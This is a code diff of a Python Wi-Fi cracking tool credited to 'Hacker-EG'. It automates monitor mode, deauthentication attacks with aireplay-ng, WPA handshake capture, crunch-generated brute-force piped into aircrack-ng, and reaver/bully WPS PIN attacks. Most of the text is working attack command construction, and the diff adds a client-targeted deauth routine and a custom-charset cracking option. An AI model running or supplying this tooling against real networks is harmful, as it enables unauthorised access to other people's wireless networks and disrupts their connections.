@@ -2,14 +2,14 @@
 import os
 import subprocess
 from subprocess import check_call
-
+print("\nInstalling Needed Tools")
+print("\n")
+cmd0 = os.system("apt-get install aircrack-ng crunch xterm wordlists reaver pixiewps bully xterm wifite")
+cmd  = os.system("sleep 3 && clear")
 def intro():
-    print("\nInstalling Needed Tools")
-    print("\n")
-    cmd0 = os.system("apt-get install aircrack-ng crunch xterm wordlists reaver pixiewps bully xterm wifite")
     cmd  = os.system("clear")
-    print("""
-------------------------------------------------------------------------------------------------
+    print("""\033[1;32m
+---------------------------------------------------------------------------------------
 ██╗    ██╗██╗███████╗██╗       ██████╗██████╗  █████╗  ██████╗██╗  ██╗███████╗██████╗ 
 ██║    ██║██║██╔════╝██║      ██╔════╝██╔══██╗██╔══██╗██╔════╝██║ ██╔╝██╔════╝██╔══██╗
 ██║ █╗ ██║██║█████╗  ██║█████╗██║     ██████╔╝███████║██║     █████╔╝ █████╗  ██████╔╝
@@ -17,8 +17,8 @@ def intro():
 ╚███╔███╔╝██║██║     ██║      ╚██████╗██║  ██║██║  ██║╚██████╗██║  ██╗███████╗██║  ██║
  ╚══╝╚══╝ ╚═╝╚═╝     ╚═╝       ╚═════╝╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝
                                                                    Coded By Hacker-EG
--------------------------------------------------------------------------------------------------                                                                       
-(1)Start monitor mode                       
+---------------------------------------------------------------------------------------                                                                     
+(1)Start monitor mode       
 (2)Stop monitor mode                        
 (3)Scan Networks                            
 (4)Getting Handshake(monitor mode needed)   
@@ -49,15 +49,16 @@ def intro():
         geny  = os.system(order)
         intro()
     elif var == 3 :
-        print("\nEnter the interface:(Default(wlan0mon/wlan1mon))")
+        print("\nEnter the interface:(Default >> (wlan0mon/wlan1mon))")
         interface = input("")
         order = "airodump-ng {} -M".format(interface)
         print("When Done Press CTRL+c")
         cmd = os.system("sleep 3")
         geny  = os.system(order)
-        cmd = os.system("sleep 5")
+        cmd = os.system("sleep 10")
+        intro()
     elif var == 4 :
-        print("\nEnter the interface:(Default(wlan0mon/wlan1mon))")
+        print("\nEnter the interface:(Default >>(wlan0mon/wlan1mon))")
         interface = input("")
         order     = "airodump-ng {} -M".format(interface)
         print("\nWhen Done Press CTRL+c")
@@ -67,17 +68,34 @@ def intro():
         geny      = os.system(order)
         print("\nEnter the bssid of the network?")
         bssid     = str(input(""))
-        print("\nEnter the Mac of the client ?")
-        client = str(input(""))
-        print("\nEnter the channel of the network?")
-        channel   = int(input())
-        print("\nEnter the path of the output file :(without .cap) ")
-        path      = str(input(""))
-        print("\nEnter the number of the packets [1-10000] ( 0 for unlimited number)")
-        dist = int(input(""))
-        order    = "airodump-ng {} --bssid {} -c {} -w {} -M | xterm -e aireplay-ng -0 {} -a {} {} | xterm -0 0 -a {} -c {} {}".format(interface,bssid,channel,path,dist,bssid,interface,bssid,client,interface)
-        geny     = os.system(order)
-        intro()
+        print("\nis there a client ?(yes/no)")
+        ask = str(input(""))
+        if ask == "yes":
+           print("Enter the mac of the client?")
+           client = str(input(""))
+           print("\nEnter the channel of the network?")
+           channel   = int(input())
+           print("\nThis HandShake File in path: /root/Desktop/target.cap")
+           cmd1 = os.system("sleep 4")
+           print("\nEnter the number of the packets [1-10000] ( 0 for unlimited number)")
+           print("the number of the packets Depends on the Distance Between you and the network")
+           dist = int(input(""))
+           order1    = "xterm -T Attacking the network -e aireplay-ng -0 {} -a {} {} | xterm -0 0 -e aireplay-ng -a {} -c {} {} ".format(dist,bssid,interface,bssid,client,interface)
+           geny   = os.system(order1)
+           order2    = "xterm -T Getting Handshake -e airodump-ng {} --bssid {} -c {} -w /root/Desktop/target -M".format(interface,bssid,channel)
+           geny2 = os.system(order2)
+           intro()
+        else:
+           print("\nEnter the channel of the network?")
+           channel   = int(input())
+           print("\nThis HandShake File in path: /root/Desktop/target.cap")
+           cmd1 = os.system("sleep 4")
+           print("\nEnter the number of the packets [1-10000] ( 0 for unlimited number)")
+           print("the number of the packets Depends on the Distance Between you and the network")
+           dist = int(input(""))
+           order    = "xterm -T Getting Handshake -e airodump-ng {} --bssid {} -c {} -w /root/Desktop/target -M | xterm -T Attacking the network -e aireplay-ng -0 {} -a {} {}".format(interface,bssid,channel,dist,bssid,interface)
+           geny     = os.system(order)
+           intro()
     elif var == 5 :
         def wire():
             cmd = os.system("clear")
@@ -241,7 +259,11 @@ pease
 (9)  Lowercase + uppercase + numeric chars           (abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789) 
 (10) Lowercase + uppercase + symbol chars            (abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!#$%/=?{}[]-*:;)
 (11) Lowercase + uppercase + numeric + symbol chars  (abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!#$%/=?{}[]-*:;)
+(12) Your Own Words and numbers
 -----------------------------------------------------------------------------------------
+Crack Password Could Take Hours,Days,Weeks,Months to complete
+and the speed of cracking will reduce because you generate a Huge,Huge Passwordlist
+may reach to Hundreds of TeRa Bits so Be patiant
 """)
         print("\nEnter your choise here : ?")
         set = str(input(""))
@@ -289,21 +311,28 @@ pease
             test = str("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!#$%/=?{}[]-*:;")
             order = "crunch {} {} {} | aircrack-ng {} -e {} -w-".format(mini,max,test,path,essid)
             geny  = os.system(order)
+        elif set == "12":
+            print("Enter you Own Words and numbers")
+            test  = str(input(""))
+            order = "crunch {} {} {} | aircrack-ng {} -e {} -w-".format(mini,max,test,path,essid)
+            geny  = os.system(order)
         else:
             print("\nNot Found")
             intro()
+        print("Copy the Password and Close the tool")
+        cmd5 = os.system("sleep 3d")
     elif var == 9 :
         print("\nEnter the minimum length of the password (8/64)?")
         mini = int(input(""))
         print("\nEnter the maximum length of the password (8/64)?")
         max  = int(input(""))
-        print("\nEnter the path of the output file with .txt ?")
+        print("\nEnter the path of the output file?")
         path = str(input(""))
         print("\nEnter what you want the password contain ?")
         password = str(input(""))
         order = ("crunch {} {} {} -o {}").format(mini,max,password,path)
         geny = os.system(order)
-        a = ("The wordlist in >>>>> {}").format(path)
+        a = ("The wordlist in >>>>> {} Named as SRART").format(path)
         print(a)
     elif var == 10:
         cmd = os.system("clear")
@@ -322,8 +351,9 @@ pease
             interface = str(input(""))
             print("\nEnter the bssid of the network ?")
             bssid = str(input(""))
-            order = ("reaver -i {} -b {} -K").format(interface,bssid)
+            order = ("reaver -i {} -b {} -vv").format(interface,bssid)
             geny = os.system(order)
+            intro()
         elif attack == 2:
             print("\nEnter the interface to start ?(Default(Wlan0mon/Wlan1mon)")
             interface = str(input(""))
@@ -333,15 +363,18 @@ pease
             channel = int(input(""))
             order = ("bully -b {} -c {} --pixiewps {}").format(bssid,channel,interface)
             geny = os.system(order)
+            intro()
         elif attack == 3:
             cmd = os.system("wifite")
+            intro()
         elif attack == 4:
             print("\nEnter the interface to start ?(Default(Wlan0mon/Wlan1mon)")
             interface = str(input(""))
             print("\nEnter the bssid of the network ?")
             bssid = str(input(""))
-            order = ("reaver -i {} -b {} -K")
+            order = ("reaver -i {} -b {} -K").format(interface,bssid)
             geny = os.system(order)
+            intro()
         elif attack == 0 :
             intro()
     elif var == 11:
